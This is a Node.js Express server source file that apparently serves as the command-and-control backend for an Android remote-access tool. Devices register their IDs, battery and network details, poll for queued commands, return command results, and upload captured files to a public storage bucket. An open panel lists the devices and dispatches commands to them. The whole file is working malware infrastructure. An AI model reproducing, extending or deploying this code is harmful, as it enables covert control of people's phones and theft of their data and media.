const express = require('express');
const multer = require('multer');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { persistSession: false } });

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });

function ts() { return Date.now(); }

// --- CLIENT ENDPOINTS ---
app.post('/connect', async (req, res) => {
  try {
    const { userId, device, android, battery, network, androidId } = req.body;
    await supabase.from('devices').upsert({
      user_id: userId, android_id: androidId, device: device, android: android,
      battery: battery, network: network, last_seen: ts()
    }, { onConflict: 'user_id' });
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false }); }
});

app.get('/sync', async (req, res) => {
  const userId = req.query.wallet;
  await supabase.from('devices').update({ last_seen: ts() }).eq('user_id', userId);
  
  const { data: pending } = await supabase.from('commands').select('*')
    .eq('user_id', userId).eq('delivered', false).order('created_at');

  if (pending && pending.length > 0) {
    await supabase.from('commands').update({ delivered: true }).in('id', pending.map(p=>p.id));
    return res.json({ ok: true, tasks: pending.map(p => ({ id: String(p.id), cmd: p.cmd, args: p.args })) });
  }
  res.json({ ok: true, tasks: [] });
});

app.post('/status', async (req, res) => {
  const { userId, cmd, data } = req.body;
  await supabase.from('results').insert({ user_id: userId, cmd: cmd, data: data, created_at: ts() });
  res.json({ ok: true });
});

app.post('/media', upload.single('file'), async (req, res) => {
  const { userId, type } = req.body;
  const ext = (req.file.originalname.split('.').pop() || 'bin').toLowerCase();
  const path = userId + '/' + type + '_' + ts() + '.' + ext;
  await supabase.storage.from('void-files').upload(path, req.file.buffer, { contentType: req.file.mimetype });
  const { data } = supabase.storage.from('void-files').getPublicUrl(path);
  await supabase.from('uploads').insert({ user_id: userId, type: type, url: data.publicUrl, created_at: ts() });
  res.json({ ok: true });
});

// --- PANEL ENDPOINTS ---
app.get('/clients', async (req, res) => {
  const { data } = await supabase.from('devices').select('*');
  const list = (data || []).map(d => ({
    userId: d.user_id, device: d.device, android: d.android,
    online: (ts() - d.last_seen) < 30000
  }));
  res.json({ ok: true, clients: list });
});

app.get('/client', async (req, res) => {
  const id = req.query.id;
  const { data: d } = await supabase.from('devices').select('*').eq('user_id', id).maybeSingle();
  const { data: results } = await supabase.from('results').select('*').eq('user_id', id).order('created_at', { ascending: false }).limit(10);
  
  res.json({
    ok: true, userId: id, online: d && (ts() - d.last_seen) < 30000,
    device: d ? d.device : '?', android: d ? d.android : '?',
    results: (results || []).reverse().map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at }))
  });
});

app.post('/dispatch', async (req, res) => {
  const { userId, cmd, args } = req.body;
  await supabase.from('results').delete().eq('user_id', userId);
  await supabase.from('commands').insert({ user_id: userId, cmd: cmd, args: args, created_at: ts(), delivered: false });
  res.json({ ok: true });
});

// --- THE KEEP-ALIVE PING ---
app.get('/', (req, res) => res.send('Server Running'));

app.listen(process.env.PORT || 3000, () => console.log('Server running'));